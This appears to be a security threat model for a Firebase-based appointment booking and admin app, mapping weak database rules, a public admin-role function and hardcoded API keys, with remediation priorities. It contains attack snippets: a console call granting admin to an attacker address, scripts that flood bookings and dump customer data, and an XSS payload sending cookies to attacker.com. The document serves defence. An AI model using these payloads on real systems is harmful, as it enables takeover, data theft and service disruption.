# 🎯 Attack Surface Analysis & Threat Model

## 📍 Attack Surface Map

```
┌─────────────────────────────────────────────────────────────────────┐
│                     YOUR APPLICATION ECOSYSTEM                       │
└─────────────────────────────────────────────────────────────────────┘

                    Internet (Untrusted)
                            │
                ┌───────────┴───────────┐
                │                       │
         ┌──────▼──────┐         ┌─────▼──────┐
         │  Booking    │         │   Admin    │
         │  Frontend   │         │  Frontend  │
         │ (Public)    │         │ (Should be │
         └──────┬──────┘         │  Protected)│
                │                └─────┬──────┘
                │                      │
                └──────────┬───────────┘
                           │
                ┌──────────▼───────────┐
                │   Firebase Auth      │
                │  🔴 WEAK: No role   │
                │     verification     │
                └──────────┬───────────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
┌───────▼────────┐ ┌───────▼────────┐ ┌──────▼──────┐
│   Firestore    │ │ Cloud Functions│ │  Firebase   │
│   Database     │ │                │ │   Storage   │
│                │ │ 🔴 CRITICAL:   │ │             │
│ 🔴 CRITICAL:   │ │ setAdminRole   │ │ ✅ Secure   │
│ • Open writes  │ │ is public!     │ │             │
│ • Public reads │ │                │ │             │
│ • No validation│ │ 🔴 Hardcoded   │ │             │
└────────────────┘ │ API keys       │ └─────────────┘
                   │                │
                   │ 🟠 Missing     │
                   │ admin checks   │
                   └────────┬───────┘
                            │
                   ┌────────▼────────┐
                   │  External APIs  │
                   │                 │
                   │ • Gemini AI     │
                   │ • SMS Service   │
                   │ • Email Service │
                   └─────────────────┘
```

---

## 🎯 Attack Vectors by Severity

### 🔴 CRITICAL Attack Vectors

#### Vector 1: Direct Admin Privilege Escalation
```
Attacker → Browser Console → setAdminRole() → INSTANT ADMIN ACCESS
         (No auth required)

Timeline: < 5 minutes
Skill Level: Script kiddie
Tools Needed: Web browser only
```

**Attack Steps:**
1. Open your website
2. Press F12 (developer console)
3. Run: `firebase.functions().httpsCallable('setAdminRole')({email: 'attacker@evil.com'})`
4. Now attacker is admin

**What They Can Access:**
- All customer PII (names, emails, phones)
- All appointments and schedules
- Business settings and configuration
- Payment information
- Can delete everything
- Can lock out legitimate admins

---

#### Vector 2: API Key Theft → Service Abuse
```
Attacker → View Source Code → Copy API Key → Use for Own Projects
         (Publicly visible)

Timeline: < 1 minute
Skill Level: None required
Tools Needed: Web browser
```

**Attack Steps:**
1. View source code or check GitHub
2. Find: `const GEMINI_API_KEY = 'AIzaSy...'`
3. Copy and use in their own applications
4. You get charged for their usage

**Financial Impact:**
- Gemini API: ~$0.001 per 1K tokens
- Attacker makes 10M API calls = $10,000+
- Your account may be suspended

---

#### Vector 3: Database Manipulation
```
Attacker → Firestore SDK → Direct Write to 'holds' → Block All Slots
         (allow write: if true)

Timeline: 10 minutes
Skill Level: Basic Firebase knowledge
Tools Needed: Firebase SDK
```

**Attack Steps:**
```javascript
// Attacker runs this in browser console:
for (let i = 0; i < 10000; i++) {
  db.collection('holds').add({
    start: new Date('2025-10-20').toISOString(),
    end: new Date('2026-12-31').toISOString(), // 1+ year hold!
    status: 'active',
    expiresAt: new Date('2026-12-31').toISOString()
  });
}
```

**Impact:**
- All appointment slots blocked
- No new bookings possible
- Revenue drops to $0
- Cleanup takes hours

---

### 🟠 HIGH Risk Attack Vectors

#### Vector 4: Customer Data Harvesting
```
Attacker → Query Firestore → Download All Customers → Sell Data
         (allow read: if true on appointments)

Timeline: 15 minutes
Skill Level: Intermediate
Tools Needed: Firebase SDK, Script
```

**Attack Code:**
```javascript
// Download all appointments (includes customer info)
const appointments = await db.collection('appointments').get();
appointments.docs.forEach(doc => {
  const data = doc.data();
  console.log(data.customerEmail, data.customerPhone, data.customerName);
  // Save to file, sell on dark web
});
```

**Compliance Risk:**
- CCPA violation: $7,500 per customer
- GDPR violation: up to €20M or 4% revenue
- Legal liability for data breach

---

#### Vector 5: SMS Spam / Phishing
```
Authenticated User → sendSMSToCustomer() → Spam All Customers
                    (No admin check)

Timeline: 5 minutes
Skill Level: Basic
Tools Needed: Valid user account
```

**Attack Steps:**
1. Create free account on your site
2. Call `sendSMSToCustomer` function
3. Send phishing SMS to all customers
4. Impersonate your business

**Impact:**
- Reputation damage
- Customer complaints
- SMS costs
- Potential scams

---

#### Vector 6: Review Bombing
```
Attacker → Create Fake Reviews → Damage Reputation
         (allow create: if true)

Timeline: Continuous
Skill Level: None
Tools Needed: Automation script
```

**Attack:**
- Post 1000s of fake 1-star reviews
- No authentication required
- Damage business reputation

---

### 🟡 MEDIUM Risk Attack Vectors

#### Vector 7: IDOR (Insecure Direct Object Reference)
```
User A → Update Customer ID of User B → Access Other User's Data
       (No ownership verification)

Timeline: 30 minutes
Skill Level: Intermediate
```

**Example:**
```javascript
// User A tries to access User B's appointments
await db.collection('appointments')
  .where('customerId', '==', 'user-b-id')
  .get(); // Succeeds if they know the ID
```

---

#### Vector 8: Cross-Site Scripting (XSS)
```
Attacker → Submit XSS Payload in Name Field → Execute in Admin Panel
         (No input sanitization)

Timeline: 1 hour
Skill Level: Intermediate
```

**Example Payload:**
```javascript
// Customer name:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

When admin views customer list, the script executes.

---

#### Vector 9: Rate Limit Bypass → Cost Inflation
```
Attacker → Call Expensive AI Functions Repeatedly → $$$
         (No rate limiting)

Timeline: Continuous
Skill Level: Basic
```

**Attack:**
```javascript
// Call skin analysis 10,000 times
for (let i = 0; i < 10000; i++) {
  await firebase.functions().httpsCallable('analyzeSkinPhoto')({
    analysisId: 'test',
    imageUrl: 'some-url'
  });
}
```

**Cost Impact:**
- Each analysis: ~$0.01
- 10,000 calls: $100
- Can run this 24/7

---

## 🗺️ Attack Surface Breakdown

### Entry Points (How Attackers Get In)

| Entry Point | Authentication Required | Authorization Check | Validation | Risk Level |
|-------------|------------------------|---------------------|------------|------------|
| **setAdminRole HTTP** | ❌ NO | ❌ NO | ❌ NO | 🔴 CRITICAL |
| **setAdminRole Callable** | ❌ NO | ❌ NO | ❌ NO | 🔴 CRITICAL |
| **Firestore 'holds'** | ❌ NO | ❌ NO | ❌ NO | 🔴 CRITICAL |
| **Firestore 'customers'** | ❌ NO | ⚠️ PARTIAL | ❌ NO | 🟠 HIGH |
| **Firestore 'appointments'** | ❌ NO | ⚠️ PARTIAL | ❌ NO | 🟠 HIGH |
| **sendSMSToCustomer** | ✅ YES | ❌ NO | ⚠️ BASIC | 🟠 HIGH |
| **analyzeSkinPhoto** | ⚠️ OPTIONAL | ❌ NO | ⚠️ BASIC | 🟡 MEDIUM |
| **findOrCreateCustomer** | ❌ NO | ❌ NO | ❌ NO | 🟡 MEDIUM |

---

## 🛡️ Defense Layers (What You Should Have)

### Current State vs. Desired State

```
┌─────────────────────────────────────────────────────────┐
│                  DEFENSE IN DEPTH                        │
└─────────────────────────────────────────────────────────┘

Layer 1: Network/CDN
├─ Current: ❌ No DDoS protection
└─ Should Have: ✅ Cloudflare/Firebase Hosting

Layer 2: Application Firewall  
├─ Current: ❌ No WAF
└─ Should Have: ✅ Firebase App Check + reCAPTCHA

Layer 3: Authentication
├─ Current: ⚠️ Firebase Auth (basic)
└─ Should Have: ✅ + MFA for admins

Layer 4: Authorization
├─ Current: 🔴 MISSING for most functions
└─ Should Have: ✅ Role-based access control (RBAC)

Layer 5: Input Validation
├─ Current: ❌ NO validation
└─ Should Have: ✅ Strict type/format validation

Layer 6: Database Security
├─ Current: 🔴 Overly permissive rules
└─ Should Have: ✅ Least-privilege rules

Layer 7: API Security
├─ Current: 🔴 Hardcoded keys, no rate limits
└─ Should Have: ✅ Environment vars + rate limiting

Layer 8: Monitoring/Logging
├─ Current: ❌ Basic logs only
└─ Should Have: ✅ Audit logs + alerts

Layer 9: Incident Response
├─ Current: ❌ No plan
└─ Should Have: ✅ Incident response playbook
```

---

## 📊 Threat Actors & Motivations

### 1. **Script Kiddies** (Most Likely)
**Skill Level:** Low  
**Motivation:** Fun, bragging rights  
**Likely Attacks:**
- Grant themselves admin access
- Deface website
- Spam database

**Likelihood:** 🔴 HIGH (easiest target)

---

### 2. **Competitors**
**Skill Level:** Medium  
**Motivation:** Sabotage, intelligence  
**Likely Attacks:**
- Steal customer list
- Block all appointment slots
- Copy business model/pricing

**Likelihood:** 🟠 MEDIUM

---

### 3. **Data Brokers**
**Skill Level:** Medium-High  
**Motivation:** Financial (sell data)  
**Likely Attacks:**
- Harvest customer PII
- Sell to marketing lists
- Identity theft

**Likelihood:** 🟡 MEDIUM (if they discover vulnerability)

---

### 4. **Ransomware Groups**
**Skill Level:** High  
**Motivation:** Financial (ransom)  
**Likely Attacks:**
- Steal all data
- Delete database
- Demand Bitcoin ransom

**Likelihood:** 🟢 LOW (small target, but possible)

---

## 🎯 Most Likely Attack Scenarios

### Scenario 1: Automated Bot Discovery (70% chance)
```
1. Bot scans GitHub for API keys
2. Finds your hardcoded Gemini key
3. Uses it for crypto mining AI prompts
4. You receive $5,000 bill from Google
```

**Timeline:** Could happen today

---

### Scenario 2: Disgruntled Customer/Employee (50% chance)
```
1. Someone mad at business
2. Googles "how to hack firebase"
3. Finds your setAdminRole function
4. Makes themselves admin
5. Deletes all appointments/data
```

**Timeline:** Could happen anytime

---

### Scenario 3: Competitor Reconnaissance (30% chance)
```
1. Competitor checks your website
2. Opens developer console
3. Sees Firebase config
4. Downloads your customer database
5. Contacts your customers with "better offers"
```

**Timeline:** Ongoing risk

---

## 🔒 How to Secure Each Attack Vector

### Priority 1: Close Critical Vectors (TODAY)
- [ ] **Remove setAdminRole function** → Blocks Vector 1
- [ ] **Revoke exposed API keys** → Blocks Vector 2  
- [ ] **Secure holds collection** → Blocks Vector 3

**Impact:** Prevents 90% of critical attacks

---

### Priority 2: Add Authorization (THIS WEEK)
- [ ] **Add admin checks to Cloud Functions** → Blocks Vector 5
- [ ] **Restrict customer data reads** → Reduces Vector 4
- [ ] **Add authentication to reviews** → Reduces Vector 6

**Impact:** Prevents most high-severity attacks

---

### Priority 3: Defense in Depth (THIS MONTH)
- [ ] **Implement rate limiting** → Blocks Vector 9
- [ ] **Add input validation** → Blocks Vector 8
- [ ] **Implement IDOR protection** → Blocks Vector 7
- [ ] **Set up monitoring/alerts** → Detect all attack types

**Impact:** Comprehensive security posture

---

## 📈 Risk Timeline

```
Day 1 (Today):
  Vulnerability: 🔴🔴🔴🔴🔴 (10/10 CRITICAL)
  Risk of Breach: 90%

After Critical Fixes (30 min work):
  Vulnerability: 🟡🟡⚪⚪⚪ (4/10 MEDIUM)
  Risk of Breach: 30%

After High Priority Fixes (1 week work):
  Vulnerability: 🟢🟢⚪⚪⚪ (2/10 LOW)
  Risk of Breach: 10%

After All Fixes (1 month work):
  Vulnerability: 🟢⚪⚪⚪⚪ (1/10 VERY LOW)
  Risk of Breach: 2%
```

---

## 🎬 Take Action Now

```bash
# Run this command RIGHT NOW:
cd /Users/kilam/Desktop/Admin-Github/Brow-Admin-Booking-Dashboard
./CRITICAL_SECURITY_FIXES.sh

# Then follow the manual steps in SECURITY_QUICK_SUMMARY.md
```

**Every hour you delay increases the chance of a successful attack.**

---

*Last Updated: October 16, 2025*  
*Threat Model Version: 1.0*  
*Next Review: After critical fixes deployed*

